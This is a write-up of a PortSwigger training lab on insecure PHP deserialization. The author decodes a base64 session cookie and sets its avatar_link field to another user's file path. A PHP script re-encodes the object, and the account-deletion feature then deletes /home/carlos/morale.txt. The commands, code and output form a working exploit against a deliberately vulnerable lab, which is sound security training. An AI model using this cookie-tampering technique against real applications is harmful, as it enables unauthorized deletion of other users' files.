# Using application functionality to exploit insecure deserialization

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization), you'll learn: Using application functionality to exploit insecure deserialization! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

You also have access to a backup account: `gregg:rosebud`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110063411.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110063420.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110063443.png)

When we successfully logged in, it'll set a new session cookie.

**URL decoded:**
```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5bnVwM2ZhOGE2djJ6MmVrYmtqbnIzMDdmdDQxdTlmaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=
```

In here, we see the last character of this session cookie is `=`, which is a base64 padding character.

**Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ5bnVwM2ZhOGE2djJ6MmVrYmtqbnIzMDdmdDQxdTlmaCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30=' | base64 -d
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ynup3fa8a6v2z2ekbkjnr307ft41u9fh";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

It's a PHP serialized object data!

In previous labs, we found that we can manipulate the PHP serialized object.

**Let's take a closer look to the `avatar_link` attribute:**
```php
s:11:"avatar_link";s:19:"users/wiener/avatar"
```

The `avatar_link` attribute is 11 characters long, and it's value is `users/wiener/avatar`.

But before we modify that value, let's poke around the web application.

**In the "My Account" page, we can delete our account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064055.png)

Let's try to delete it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064223.png)

When we clicked the "Delete account" button, it'll send a POST request to `/my-account/delete`.

Hmm... It also seems like our avatar has been deleted.

**Armed with above information, we can modify the `avatar_link` attribute value to `/home/carlos/morale.txt`. By doing that, we might able to delete that file!**

Let's login to our backup account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064500.png)

**New PHP serialized object:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo 'Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImFlMXB1c2Frd3Vtc2FscjRtZ3N1emprcHAycTJjeDBoIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9' | base64 -d
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ae1pusakwumsalr4mgsuzjkpp2q2cx0h";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

```php
<?php
    $serializedObject = 'O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ae1pusakwumsalr4mgsuzjkpp2q2cx0h";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}';

    $deserializedObject = unserialize($serializedObject);
    echo "[+] Deserialized: \n";
    var_dump($deserializedObject);

    echo "[+] Base64 encoded: \n" . base64_encode($serializedObject);
?>
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# php serialization.php
[+] Deserialized: 
object(__PHP_Incomplete_Class)#1 (4) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["username"]=>
  string(5) "gregg"
  ["access_token"]=>
  string(32) "ae1pusakwumsalr4mgsuzjkpp2q2cx0h"
  ["avatar_link"]=>
  string(23) "/home/carlos/morale.txt"
}
[+] Base64 encoded: 
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImFlMXB1c2Frd3Vtc2FscjRtZ3N1emprcHAycTJjeDBoIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```

**Then, copy that base64 encoded string and paste it to the session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064806.png)

**Refresh the page, and click "Delete account":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064835.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-3/images/Pasted%20image%2020230110064847.png)

Nice!

# What we've learned:

1. Using application functionality to exploit insecure deserialization